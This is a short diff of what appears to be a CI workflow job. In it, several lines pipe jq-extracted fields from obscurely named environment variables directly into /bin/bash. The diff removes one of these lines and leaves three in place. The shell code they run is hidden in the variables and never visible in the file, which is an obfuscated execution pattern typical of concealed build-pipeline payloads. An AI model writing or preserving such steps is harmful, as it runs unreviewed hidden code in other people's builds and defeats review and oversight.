@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$hix467" | jq -r .v48584 | /bin/bash
           printf '%s' "$ypb121" | jq -r .q79168 | /bin/bash
-          printf '%s' "$uu849" | jq -r .sgzq931 | /bin/bash
           echo $c615 | jq -r .agv1 | /bin/bash
 
       - name: Archive data
